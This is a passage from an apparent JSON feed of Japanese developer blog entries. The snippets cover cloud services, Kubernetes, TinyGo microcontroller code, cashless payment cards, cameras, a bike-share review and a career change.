pic.twitter.com/veszvzrl7p— てんま (@pranc1ngpegasus) 2021年2月21日  twitter.comFlexiSpotの恩恵により、姿勢を変えながらの作業はかなり快適で集中力がこれまでよりも長く続くと感じました。また、広いデスク領域があるので趣味であるカメラコーナーを設置することができたり、まだ計画中ですが観葉植物なども置きたいと考えています。ほんとうに作ってよかった!!","link":"https://pranc1ngpegasus.hatenablog.com/entry/2021/02/23/175300?utm_source=feed","isoDate":"2021-02-23T08:53:00.000Z","dateMiliSeconds":1614070380000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"markedjs/markedでmarkdownにclassをつけてcssを当てる","contentSnippet":"前提markdownからhtmlに変換するライブラリはmarkedを使います。https://github.com/markedjs/markededitorはreact-simplemde-editorを使います。https://github.com/RIP21/react-simplemde-editorReact component wrapper for EasyMDE (the most fresh SimpleMDE fork). 環境node 14.10.1react 17.0.1marked 1.2.7react-simplemde-editor...","link":"https://zenn.dev/tayusa/articles/54128714c8ee2d","isoDate":"2021-01-25T02:16:44.000Z","dateMiliSeconds":1611541004000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"AWS ソリューションアーキテクト アソシエート合格までのまとめ","contentSnippet":"#目次#0. はじめに先日、AWS ソリューションアーキテクト アソシエート に合格したので、忘れないうちに色々とアウトプットしておこうと思います。これから受験を考えている方の役にたてればと思い…","link":"https://qiita.com/dirtymosschan/items/da3eebdf6b7be9c3eb67","isoDate":"2021-01-19T13:11:47.000Z","dateMiliSeconds":1611061907000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"glibc, musl libc, go の resolver の違い","contentSnippet":"先日、resolv.conf で timeout を調整したいなと思うことがありました、しかし、Docker だの Kubernetes だのといった時代です。Linux しか使っていなかったとして…","link":"https://qiita.com/yteraoka/items/e74e8bf24f72f7ed5f15","isoDate":"2021-01-13T14:04:22.000Z","dateMiliSeconds":1610546662000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GCP Cloud Runの概括","contentSnippet":"概要フルマネージドのサーバーレスプラットフォーム。トラフィックに応じて自動でスケーリング。コンテナをデプロイするから言語が自由。Cloud BuildやCloud Loggingと統合されていてデプロイやログ収集が手軽。従量課金。リクエストが処理されている間が請求対象。シンプルな構成のマイクロサービスにはうってつけ。複雑な構成管理が必要ならGKE。 パフォーマンスに関して 注意とtipsレスポンスを返すとインスタンスのCPUアクセスが無効か制限されるのでバッググラウンドで処理しない。メモリが使われるので一時ファイルは削除する。動的型付け言語の場合はライブ...","link":"https://zenn.dev/tayusa/articles/74a95f41f00792","isoDate":"2021-01-05T18:59:11.000Z","dateMiliSeconds":1609873151000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"GCP の Identity Aware-Proxy を使って SSH した話","contentSnippet":"#Cloud Identity Aware-Proxy とは？一言で表すと、Google のアカウントを使ってセキュアにリソースに接続できるプロキシサービスです。###何ができる？GCP 上の…","link":"https://qiita.com/dirtymosschan/items/fd11001daa68d7c8d943","isoDate":"2020-12-22T11:20:18.000Z","dateMiliSeconds":1608636018000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"gRPC-WebとGoとVue.jsで簡素なチャット","contentSnippet":"はじめに何だか良くわからないけどよく聞くgRPC-Webなるものを触りだけでも理解すべく辛うじてチャット呼べそうなものを作ってみました。概要gRPCとはhttps://grpc.io/Pr…","link":"https://qiita.com/atsuya0/items/f994ca9d820d307daffd","isoDate":"2020-12-17T17:06:43.000Z","dateMiliSeconds":1608224803000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"VolumePlugin がボリュームを作成・マウントするしくみ","contentSnippet":"はじめにPod の作成時、pod.spec.volumes に記述したボリュームがコンテナにマウントされます。マウントされる Node 側のボリュームを、VolumePlugin がどのように作…","link":"https://qiita.com/kyohmizu/items/40bee7037e1ce7949772","isoDate":"2020-12-17T10:54:47.000Z","dateMiliSeconds":1608202487000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Sidekiqのジョブをパフォーマンスを考えて削除する","contentSnippet":"はじめにRailsで処理を何らかの理由で遅延させた場合や非同期に処理を行いたいときに多くの人がActive Jobを使用していると思います。とても便利で良いやつなのですがキューに積んだジョブを削…","link":"https://qiita.com/atsuya0/items/30d6259766a9a0d5103d","isoDate":"2020-12-12T17:37:05.000Z","dateMiliSeconds":1607794625000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"任意のファイルをPNGファイルで隠してみる","contentSnippet":"はじめにある日、私はファイルを連結したらどうなるんだろうという好奇心に逆らえず、おもむろに連結して確かめてみることにしました。結果、その連結したファイルは普通にファイルとして使えることがわかりま…","link":"https://qiita.com/atsuya0/items/a8ccbc9637c37cdf967e","isoDate":"2020-12-12T14:56:30.000Z","dateMiliSeconds":1607784990000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":".gcloudignoreの書き方","contentSnippet":".gcloudignore の設定が思ったとおりに、いかなかったのでまとめます。.gitignoreと同じらしいですが、そもそもgitで今まで全体をignoreすることはやったことなかったので基本はコチラに書いてあるのですが、わからなかった部分も含みますhttps://cloud.google.com/sdk/gcloud/reference/topic/gcloudignore# 始まりはコメントです 基本の考え ファイル指定以下パターンすべてプロジェクト直下のものが対象になります。否定する場合は ! をつけます。!a.txt というファイルをデプロイ対象にしたい...","link":"https://zenn.dev/satohjohn/articles/11df180df878ac","isoDate":"2020-11-30T09:57:54.000Z","dateMiliSeconds":1606730274000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"GAE + Java 11 + Quarkusってどんなもんよ","contentSnippet":"基本的に今までTypeScript + Node.jsで書いてましたが、そろそろJVMを書きたいという気持ちが出てきました。ただし、Standard環境のGAEは良いものだと知ってしまった、、、ということでJava 11でかけないかなと思いました。GAE + Java 11を利用する上で考えるのは、 初回リクエストのレスポンス速度 (JVMの起動速度+アプリケーションの起動速度) が問題になるかと思います。では、高速に起動する(?)と言われるQuarkusを使って見たらどうだろうと思い、ちょっと調査してみました。Javaと言いながらKotlinで作ってますが、あんまり変わらない(...","link":"https://zenn.dev/satohjohn/articles/70a2b77308e0b982fb70","isoDate":"2020-11-07T13:08:25.000Z","dateMiliSeconds":1604754505000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"フロントエンド(SPA)でのFirebase Authとの付き合い方","contentSnippet":"Firebase Authで取得したID Tokenをどう使うか、どう保管するかが結構難しいと思っています。その中で、WebアプリケーションにおいてFirebaseのドキュメントには2パターンがあるように見えました。Cookieを使ったSession管理ID Token+Service Workerを使った管理(Betaっぽい)自分としてはそれぞれのメリット・デメリットがあると感じましたので、まとめます。 1. Cookieを使ったSession管理メリット自分でCookieの長さを決められる.2週間に設定することもできる（ID Tokenの期限は1時間)古いブ...","link":"https://zenn.dev/satohjohn/articles/d39cf288dcfbe5e39c3b","isoDate":"2020-11-03T14:40:40.000Z","dateMiliSeconds":1604414440000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Istio の timeout, retry, circuit breaking, etc","link":"https://medium.com/sreake-jp/istio-%E3%81%AE-timeout-retry-circuit-breaking-etc-c170285447e8?source=rss-8b55af126a13------2","isoDate":"2020-10-17T14:52:08.000Z","dateMiliSeconds":1602946328000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"正しく知って便利に使おう。Kyashの話 ~第2弾 どんな仕組みなの? ~","contentSnippet":"これはなに紙幣や硬貨といった現金を使わずに決済を行うキャッシュレス決済。おことわりこの記事の情報は2020年9月現在のものであり、今後サービス内容が変更される場合があります。最新の情報は株式会社Kyashホームページをご覧ください。カード決済ってどういう仕組みなの?カードには3種類ある!?決済を行うことができるカードとして、クレジットカード、プリペイドカード、デビットカードの3種類があります。ブランド、イシュア、アクワイアラカード決済は、クレジットカードやプリペイドカードなどのカードを発行するだけでは成り立ちません。国際ブランド、イシュア、アクワイアラなどさまざまな会社が連携して実現しています。カード決済は2段階!?カード決済は「オーソリ」と「売上確定」の2段階に分かれており、不正決済の防止や利用限度額の確認などを行っています。Kyashはどういう仕組みなの?Kyashには、Kyash CardやKyash Card Liteなどを利用する方法の中でカード決済が関わる部分としてKyashへの入金とKyashからの支払いの2つがあります。まとめKyashはカード決済を実現する会社の中で、「加盟店」と「イシュア」の役割をしていることがわかりました。KyashはVisaブランドで発行されるプリペイドカードなので、事前にチャージする必要があり、その手段としてクレジットカードやデビットカードを使っていることもわかりました。仕組みがわかると、より安心して便利に使えそうですね。ぜひ、みなさんも使ってみてはいかがでしょうか?","link":"https://pranc1ngpegasus.hatenablog.com/entry/2020/09/17/153000?utm_source=feed","isoDate":"2020-09-17T06:30:00.000Z","dateMiliSeconds":1600324200000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"正しく知って便利に使おう。Kyashの話 ~第1弾 Kyashってなに? ~","contentSnippet":"これはなに紙幣や硬貨といった現金を使わずに決済を行うキャッシュレス決済。おことわりこの記事の情報は2020年8月現在のものであり、今後サービス内容が変更される場合があります。最新の情報は株式会社Kyashホームページをご覧ください。Kyashとは?Kyash（キャッシュ）-チャージ式VisaカードKyashファイナンス無料apps.apple.complay.google.comKyashはVisaブランドで発行されるプリペイドカードです。Kyashを使うメリットとは?リアルタイムに履歴や利用状況を見ることができるKyashのカードはアプリと連動しており、カードで支払った履歴やカードの残高などを確認することができます。アプリに表示されている情報はリアルタイムな情報で、これまで利用してきた加盟店および金額や、Kyashを使っている人同士の送金額などを確認することができます。その場でカード決済をストップできるKyashアプリ上の「カードロック」ボタンをタップすると、Kyashカードで行われる決済をその場でストップすることができます。もちろんその場でロックを解除することもできるので、「使うときだけロック解除、普段はカードロック」をすることで不正対策をすることができます。使いすぎを防止することができるKyashカードはプリペイドカードなので、チャージした金額分だけが利用できます。これにより使いすぎに気づくことがで、利用履歴などと合わせて「どこで使いすぎたのか」を分析することができます。Kyashから最大1%のポイントバックを受けられるKyashカードは支払い金額の0.5~1%(カード種別による)をポイントとして付与してくれます。これによりクレジットカードのポイント0.5~1% + Kyashのポイント0.5~1%の最大2%のポイントバックを受けることができます。まとめKyashはアプリと連携するVisaプリペイドカードです。アプリを通じてその場で通知を受けとったり、カードのロックをかけたりすことができるため非常に便利です。ぜひ、みなさんも使ってみてはいかがでしょうか?n","link":"https://pranc1ngpegasus.hatenablog.com/entry/2020/09/10/160900?utm_source=feed","isoDate":"2020-09-10T07:09:00.000Z","dateMiliSeconds":1599721740000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Kubernetes (k8s) 管理者用GUI Lens","contentSnippet":"Lensとはlensapp/lensk8sで動作する全てのリソースをモニタリングしてくれるGUIアプリLinux/Mac/Windowsで動作するこんな感じ（kindで作ったクラスタ見てます）…","link":"https://qiita.com/tozastation/items/804949c69df5d53643c6","isoDate":"2020-09-07T12:53:18.000Z","dateMiliSeconds":1599483198000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Cloud SQLへのprivate ip 接続でハマった話","contentSnippet":"概要Cloud SQL(MySQL)に対してprivate ipを使ってアクセスしたときに、何をチェックしたかをメモするハマったからにはきちんとログを残す現象GCE から Cloud SQL…","link":"https://qiita.com/SatohJohn/items/e79f363798a6233f9ad2","isoDate":"2020-08-07T16:53:50.000Z","dateMiliSeconds":1596819230000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"情報処理安全確保支援士の関連資料","contentSnippet":"情報処理安全確保支援士の業務を行う上で、参照すべき資料一覧です。サイバーセキュリティ基本法（平成二十六年法律第百四号）情報処理の促進に関する法律（昭和四十五年法律第九十号）情報処理学会倫理綱領RFC:1087 倫理とインターネット(Ethics and the Internet)セキュリティ対応組織 (SOC,CSIRT)強化に向けたサイバーセキュリティ情報共有の「5W1H」 v2.0 (2019年4月)JPCERT インシデントハンドリングマニュアルIPA 脆弱性対策の効果的な進め方（ツール活用編）情報セキュリティ早期警戒パートナーシップガイドラインIPA 重要なセキュリティ情報一覧IPA 共通脆弱性評価システムCVSS v3概説JVN (Japan Vulnerability Notes)JVN 脆弱性レポートの読み方JVN iPediaFIRST Common Vulnerability Scoring System SIGCWE (Common Weakness Enumeration)IPA 脆弱性体験学習ツール AppGoatMyJVNIPA 組織における内部不正防止ガイドライン地方公共団体における情報セキュリティポリシーに関するガイドライン(平成30年9月版)IPA 委託関係における情報セキュリティ対策ガイドラインIPA 中小企業の情報セキュリティ対策ガイドラインIPA 情報漏えい対策のしおりNISC スマートフォン等の業務利用における情報セキュリティ対策の実施手順作成手引書個人情報の保護に関する法律についてのガイドラインIPA 企業(組織)における最低限の情報セキュリティ対策のしおりスマートフォンのセキュリティ＜危険回避＞対策のしおりJPCERT/CC 技術メモ - 安全な Web ブラウザの使い方IPA ウェブブラウザのプロテクションプロファイル","link":"https://kyohmizu.hatenablog.com/entry/2020/08/05/115459","isoDate":"2020-08-05T02:54:59.000Z","dateMiliSeconds":1596596099000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"TinyGoを触ってみよう!","contentSnippet":"TinyGoって?Go compiler for small places. Microcontrollers, WebAssembly, and command-line tools. Based on LLVM.LLVMをベースとしたマイコン、WebAssembly、CLI向けのGoコンパイラ。TinyGoの長所・短所いいところGoの最適化とLLVMの最適化の両方を受けることができるCで書かれたコード資産をCGO経由で再利用できるAVR系のマイコンを除きGCを持っているのでメモリ管理がラクもうちょっとなところLLVMバックエンドが大きいgoroutineがホンモノじゃない (LLVMのcoroutineに変換される)encoding/jsonが動かないTinyGoでLチカ (LEDチカチカ)なにをするの?TinyGoでコードを書いて、Arduino UnoのLEDをチカチカさせてみようどんなコードを書くの?package mainimport (    \\"machine\\"    \\"time\\")func main() {    led := machine.LED    led.Configure(machine.PinConfig{Mode: machine.PinOutput})    for {        led.Low()        time.Sleep(time.Millisecond * 1000)        led.High()        time.Sleep(time.Millisecond * 1000)    }}TinyGoでサーボモータを動かすなにをするの?TinyGoでコードを書いて、Arduino Unoに接続されたサーボモータを動かしてみようどんなコードを書くの?package mainimport (  \\"machine\\"  \\"time\\")const (  waitMilliSec = 100 * time.Millisecond)func main() {  machine.InitPWM()  servo := machine.PWM{Pin: 5}  servo.Configure()  var pwmValue uint8 = 0  for {    if pwmValue < 0 || 255 < pwmValue {      pwmValue = 0    } else {      pwmValue = pwmValue + 10    }        servo.Set(uint16(pwmValue) << 8)    time.Sleep(waitMilliSec)  }}まとめTinyGoはGoと全く同じ書き方でマイコン用コードを書くことができた。TinyGoはArduinoとの統合を発表しており、これからますます機能の拡充がされていく模様。マイコン用言語の第一歩がC/C++からTinyGoに置き換わる時代がくるかもしれない。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2020/12/09/000000?utm_source=feed","isoDate":"2020-07-08T15:00:00.000Z","dateMiliSeconds":1594220400000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"AWS CodeBuild において オンプレのJenkins では成功していたファイル権限系のテストをするとうまくいかない","contentSnippet":"この記事を書くに至った経緯私が開発しているチームでは、Jenkinsでビルド・テストを行っていました。色々と環境をAWSに載せ替えていく中で、AWS CodeBuildを使用することになりました。ところが、ReadOnlyに設定したファイルにWriteできないことをテストすると失敗しているではないか…","link":"https://qiita.com/tayakun/items/6b721985bc098dda9846","isoDate":"2020-06-22T15:15:05.000Z","dateMiliSeconds":1592838905000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Mac VScode Maven でJunit 使ってみた","contentSnippet":"はじめにとりあえずVSCodeでJUnit使ってユニットテスト体験してみたい人が対象です。まだJavaすらMacに入れてないんだ！って人はこちらを参考にしてみてください。動作環境macOS …","link":"https://qiita.com/tayakun/items/16201aa0371fa874ec78","isoDate":"2020-06-19T18:23:53.000Z","dateMiliSeconds":1592591033000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Cotteaで自分に合ったコーヒーを探してみた","contentSnippet":"これはなにwww.cottea.jpCotteaというサービスで自分に合ったコーヒーを探してみたのでまとめる。Cotteaとはコーヒーの豆を、産地や品種、豆の焙煎具合ではなく好みの風味や食べ物とのマッチングで紹介してくれるサービスである。無料お試しを注文をしてみた自分に合った豆をおすすめしてくれるWebでいくつかの質問に答えていくと、自分に合ったブレンド豆をおすすめしてくれる。届いたのはこの3種類☕️A-4www.cottea.jp溶かしたバターやオイルのようなとろりとした質感をベースに強いピーナッツの香りが特徴です。 飲み終わった後の程よい酸味はレーズンやナツメのような味です。苦くない香ばしいコーヒーを求める方におすすめです。 フードペアリング : バゲットとの相性が最高です。☕️B-2www.cottea.jp一口飲むと炭火で焼いたアーモンドやピーナッツが思い浮かびます。 飲み終わった後に口の中に残る苦味はもう一口飲みい気分にさせます。 香ばしいコクのあるコーヒーを求める方におすすめです。 フードペアリング : ピーナッツ、アーモンド、くるみなどのナッツ製品とよく合います。☕️D-2www.cottea.jpさっぱりした質感で口の中にヘーゼルナッツの香りが広がります。 酸味は巨峰を思わせる甘酸っぱい味でダークチョコレートのような程よい苦味があります。 バランスの取れた酸味と苦味を楽しみたい方におすすめです。 フードペアリング : 卵サンドウィッチとよく合います。B-2を飲んでみた豆をミルに移したときからナッツを思わせる香りがふんわりと薫っていい気分にさせてくれる。D-2を飲んでみたこちらも豆の状態ではナッツのような香りがふんわり薫ってくる。A-4を飲んでみた豆の状態ではピーナッツの香りが強く、口に含んでもナッツのような香りが楽しめた。まとめ今回はCottea.jpで自分に合ったコーヒー豆を探してみた。おすすめいただいた3つの中ではB-2が一番好きな風味だと感じ、深煎りのナッツのような風味の豆が好みであることがわかった。今後も自分好みのいろいろな豆でコーヒーを楽しんでいくための参考にしたい。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2020/06/19/105800?utm_source=feed","isoDate":"2020-06-19T01:58:00.000Z","dateMiliSeconds":1592531880000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"私的キャッシュレス生活まとめ","contentSnippet":"これはなに個人的に使っている金融サービスを図に書き起こしてみたくなったのでまとめた。どんな金融サービスを使っているの?SMBCメインの銀行。イオン銀行主に貯蓄用の銀行。pring主にSMBC - イオン銀行間の送金や現金引き出しの際にセブン銀行を経由するために使っている。ANAカード日常の支払いの全てを担っているクレジットカード。普段はお財布の中にしまっている。KyashKyashが提供しているプリペイドカード。物理カードを発行しているが普段はお財布の中にしまっている。モバイルSuica言わずと知れた交通系ICカード。普段はiPhoneに入っている。Revolut最近、日本に上陸したイギリス発のフィンテック。Kyashみたいなやつ。普段の買い物はこれがメイン。QuicPayKyashがApple Payに対応したので設定している。普段はほとんど使わない。工夫していることモバイルSuicaのチャージ元をRevolutにすることでKyash + クレジットカードで計2%分のポイントを回収pringを経由したATM出金でいつでもATM手数料無料KyashやRevolutなどのリアルタイム性を持った支払い手段を使うことで不正決済をすぐに検出 & クレジットカードの存在を隠蔽Revolutで支払い種目を分類・管理することで使いすぎを防止まとめめんどくさがりなのでECサイトにおける決済でポイントサイトを経由するなどの複雑なことはしていない。なにかの参考になれば。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2020/06/19/104500?utm_source=feed","isoDate":"2020-06-19T01:45:00.000Z","dateMiliSeconds":1592531100000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"わたしの「カメラのたのしみ方」","contentSnippet":"私がカメラを本格的にはじめるきっかけとなったのは、とあるアイドルの存在だった。最近のアイドルグループは販売促進のためか、写真撮影を許可していることがある。運営にとってみればファンが撮影した写真を拡散してもらうことでグループの知名度を上げることができるし、ファンにとってみれば自分が撮影した写真がメンバーに評価されることでこれ以上ない喜びを感じることができる。こんな仕組みで撮影可能なアイドルグループには「カメコ」と呼ばれるカメラを持ったファンが殺到するわけだが、私も例に漏れずカメコをやっていた。はじめの一歩私が自ら最初に買ったカメラはCanon EOS 6D Mark IIである。cweb.canon.jp合わせて購入したのが、SIGMA 24-105mm F4 ArtとSIGMA 100-400mm F5-6.3 Contemporaryである。www.sigma-global.comwww.sigma-global.com私が推していたアイドルグループは結成したて、デビューしたてのグループだったのでライブハウスでのライブが多く、非常に暗い環境で撮影する必要があったためフルサイズ機を選択した。この機材で初カメコをした写真が以下である。Camera: EOS 6D Mark II推しメンの勇姿をカメラにおさめられる感動、「もし推しメンがこちらを見つけて目線をくれたら」のスリルがたまらなくなり、カメコの沼へとどっぷり浸かることになった。www.sigma-global.comCamera: EOS 6D Mark IICamera: EOS 6D Mark IIメーカー最上位機種へのステップアップカメラ沼にどっぷりハマった私が次なる戦力を求めて買ったカメラがCanon EOS 1D X Mark IIである。faq.canon.jp言わずと知れたキヤノン最上位機種であり、これで撮れないものは誰にも撮れないと言わんばかりの機材である。Camera: EOS 1D X Mark IICamera: EOS 1D X Mark IICamera: EOS 1D X Mark IICamera: EOS 1D X Mark II自作の写真集グループ初の全国ツアーを終え、オタク仲間たちと一緒に全国6箇所を回ったツアーの写真集を作成した。もちろん全て自分たちで撮影した写真、表紙デザインから写真の配置まで全て自分たちで行った。これをメンバーたちにプレゼントしたところ、大変喜んでくれファンの1人としてもとても嬉しい気持ちになった。旅先で出会った美しい風景Camera: EOS 1D X Mark IICamera: EOS 1D X Mark IICamera: EOS 1D X Mark IICamera: EOS 1D X Mark IIライブの合間に様々な場所に出掛けることができたし、美しい風景で出会うことができて、推しグループには大変感謝している。この頃にSIGMAが新製品として70-200mm F2.8 Sportを発表し、24-105mm F4と100-400mmの組み合わせから24-70mm F2.8 Artと70-200mm F2.8 SportsのF2.8コンビに乗り換えを行った。www.sigma-global.comwww.sigma-global.com推しの脱退と愛機との別れ突然、推しのグループ脱退が発表された。と同時に、最後の24時間イベントの開催も発表された。推しとの時間は残り1ヶ月しかない。この頃から私は、写真に物語を乗せることを意識し始めた。Camera: EOS 1D X Mark IICamera: EOS 1D X Mark IICamera: EOS 1D X Mark IICamera: EOS 1D X Mark IIアイドルとしてステージに立つ推しの最後の勇姿をおさめた後、私のEOS 1D X Mark IIはシャッターユニットの耐久回数である40万回を迎え、お別れとなった。カメラとの新たな向き合い方推しが卒業してからすぐに、EOS Rに乗り換えた。cweb.canon.jpCamera: EOS RしかしEVFが自分の使い方に合わず、すぐにEOS 5D Mark IVに乗り換えた。cweb.canon.jpCamera: EOS 5D Mark IVCamera: EOS 5D Mark IVCamera: EOS 5D Mark IVアイドルという被写体ではなくなったとはいえ、撮影することへの感動や楽しさは日に日に増すばかりで、カメラは私にとって旅先での美しい風景や思い出を残す道具となった。カメラの脱構築ストリートスナップやおでかけ撮影にEOS 5D Mark IVはあまりに大きいし、重たいし、気軽に持ち出せる機材ではないなと思いはじめた頃にSIGMAからfpが発表された。フルサイズベイヤーセンサを搭載しつつ、世界最小最軽量を実現したカメラである。www.sigma-global.comCamera: SIGMA fpCamera: SIGMA fpCamera: SIGMA fpSIGMA fpは小型軽量なうえ描写が非常にシャープで撮影欲を掻き立ててくれる。Foveonの呼び声SIGMA fpに出会ってからというもの、SIGMAのカメラ、SIGMAのレンズが描く世界の虜になった。ボディがキヤノン機だった頃からレンズはSIGMAばかり使ってきたが、fpの大きさと軽さでここまで素晴らしい描写ができるのかと驚きばかりの日々だった。SIGMAといえばアメリカFoveon社と共同で独自のセンサを開発していることで有名である。デジタルカメラで一般的なベイヤーセンサと違い、フィルムのような3層構造をとることで原理的に偽色が発生しない。www.sigma-global.comfpで初採用されたTeal and Orangeのカラーフィルタがsd Quattroやdp QuattroなどのFoveon機にも展開されるとのことで、すぐにFoveon機を購入した。dp Quattroシリーズは単焦点のレンズが組み合わされており、焦点距離によってdp0, dp1, dp2, dp3とモデルが分かれている。Camera: SIGMA dp1 QuattroCamera: SIGMA dp1 Quattro私の「カメラのたのしみ方」これまでは「行く先々をカメラにおさめる」ような撮影スタイルだったが、最近は「写真を撮りに行く先を探す」ようになった。いままでも、これからも、そんなカメラが大好きである。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2020/06/18/211900?utm_source=feed","isoDate":"2020-06-18T12:19:00.000Z","dateMiliSeconds":1592482740000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Handy Admission Webhook Library","contentSnippet":"Kubernetes の Admission Webhook を開発する際に、kubernetes/api をラップした軽量なライブラリやフレームワークを使うことがあると思います。kubernet…","link":"https://qiita.com/toVersus/items/5316e94490d60c220af7","isoDate":"2020-06-14T05:05:07.000Z","dateMiliSeconds":1592111107000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Mac VSCode JavaでHelloWorldした","contentSnippet":"はじめにタイトル通り、ただHelloWorldするだけです。よくある標準出力するだけの課題とかをささっとすますにはいいかもしれません。今からこの環境でWebアプリとか作っちゃうんだ！って人には…","link":"https://qiita.com/tayakun/items/a38386288c50233c6a90","isoDate":"2020-06-10T14:57:49.000Z","dateMiliSeconds":1591801069000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Chaos Mesh によるカオスエンジニアリング","link":"https://medium.com/sreake-jp/chaos-mesh-%E3%81%AB%E3%82%88%E3%82%8B%E3%82%AB%E3%82%AA%E3%82%B9%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%83%AA%E3%83%B3%E3%82%B0-46fa2897c742?source=rss-8b55af126a13------2","isoDate":"2020-06-02T03:16:16.000Z","dateMiliSeconds":1591067776000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"シェアサイクルLUUPに乗ってみた","contentSnippet":"LUUPって?luup.sc電動キックボードのシェアリングサービスです。詳細は上記リンクへ。どうやって乗るの?まずは近くのポートに行くアプリを開いて「ロック解除」を押下サドル下のQRコードを読み取るように指示されるので読み取る返却予定のポートを指定する開錠されるので乗る自転車の特徴電動アシスト付き自転車小回りがきく小径車鍵・ライト付きレビュー環境天気: ちょっと雨乗車した感想LUUPのシェアサイクル乗ってみた!よいところ- 前後ディスクブレーキで制動性◎- 電動アシストが強力で坂道も◎- 乗ったら自動でライトがつく◎- 料金がわかりやすくお手頃で◎がんばろうなところ- 一時降車 -> 再度乗車のUI (鍵の解除方法がわかりにくかった)#LUUP pic.twitter.com/aAdLGkRIX9— てんま (@pranc1ngpegasus) 2020年5月26日  twitter.com乗車した日は少し雨が降っていて、ちらほら傘をさして歩いている人を見かけました。乗るまでのアプリ操作は非常にスムーズに行うことができて、あっという間に準備が完了しました。\uD83D\uDE04ブレーキ性能のよさ筆者は過去にマウンテンバイクのレースに出場していた経験があるのですが、木々の間を高速で駆け抜けたり泥だらけになったりするマウンテンバイクの競技でもほとんどの自転車に採用されている「ディスクブレーキ」という形式のブレーキが採用されていて驚きました。それ故雨の日でもブレーキの効きが非常によく、狭い歩道を歩いてくる歩行者を避けたり、狭い路地から出てきた車を避けたりするのが容易にできました。\uD83D\uDE04電動アシスト筆者は電動アシスト自転車に乗るのが初めてだったのですが、「背中を押される」というより「サドルあたりを押される」に近い感覚の強力なアシストの恩恵を受けました。平地では少し漕ぐだけで強力にアシストしてくれるのであっという間にスピードに乗ることができて快適でした。ただし急な坂道になるとペダリングをサボることを許されず、ペダルをある程度踏み込んで「私はこの坂を登るのだ」という意思を伝えてあげないと手伝ってくれないスパルタ機能が装備されていました。\uD83D\uDE22一時停車 -> お買いもの -> 再度乗車のUI筆者は少し遠い場所にあるお店に買い物に行き、到着して鍵を閉めるところまではうまくできました。買い物から戻ってきて開錠をする方法がわからず戸惑ってしまいました。開錠をするときはアプリ画面の\uD83D\uDD12鍵ボタン(ちょうどiPhoneでいう画面回転を固定するアイコン)を押すとできました。このアイコン表示は少しわかりにくいと感じていて、たとえば「鍵」と「再開」を組み合わせて\uD83D\uDD12▶️のようなアイコンでもいいかなと思いました。まとめ総合的に大満足なサービスでした。今後は電動キックボードの提供も開始するようなので、いろいろな形態の乗り物を手軽に借りることができてワクワクします。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2020/05/26/192000?utm_source=feed","isoDate":"2020-05-26T10:20:00.000Z","dateMiliSeconds":1590488400000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"GitHub ActionsからGAEにdeployする際のsecretの扱い","contentSnippet":"概要この記事の内容としては以下の通りGAEのapp.yamlが環境変数を読み取らないので、値をなんとか渡す方法。GitHubActionsで認証ファイルを扱う方法。ユースケースとして、GAE…","link":"https://qiita.com/SatohJohn/items/2341168ccb93c5e144ab","isoDate":"2020-05-13T08:20:51.000Z","dateMiliSeconds":1589358051000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"3月末日で退職してました","contentSnippet":"株式会社モバイルファクトリーを3/31で退職してました。2010年6月入社なので9年10ヶ月になりますね。今は新しい会社のSREチームで働いています。前半数年間はケータイ向けのサイト(いわゆる着メロサイト)やソーシャルアプリの開発運用をしていました。後半数年間は社内全体の開発基盤・運用基盤の整備をしていました。いわゆるインフラよりのお仕事ですね。入社当時Webアプリケーション開発をまったく分かってなかったところからなんとか人並みに運用開発できる力をこの会社で身につけることが出来たと思います。今なんとかwebエンジニアをやれてるのはこの会社のおかげと言っても過言では無いと思っています。入社当時SQLをまともに書けなかったくらいのレベルだったのでよく採用されたなと。。。お仕事的には回りのレベルも高いし、自身の仕事のやり方も裁量を与えられていたし、社内環境も、待遇も悪くなかった。むしろ良かったくらいでした。ただ、長年勤めていく内に悪い意味での慣れが出てきて、自分自身停滞感を感じることが出てきました。ここ数年が特に感じることが多く、停滞感から来る焦りを日々感じていました。どうにか停滞感を解消するために副業として他社のお仕事を請け負ったりしていましたが、どうにも解消ができずにいました。そんな折に現職のSREチームの話をいただきました。実際に面談、面接を受けて、課題や環境の話を聞くにつれて、ここでなら一歩進めるのではないかという感触を得ました。もちろん焦燥感、停滞感はあれど、居心地が良いと感じてた今までの環境を変えることにはかなりの葛藤がありました。いろんな決め手はあったのですが、新しい場所の方が一番の下手*1でいれそう、なにより事業的にも業務的にも仲間的にもワクワクできそうというあたりが決定打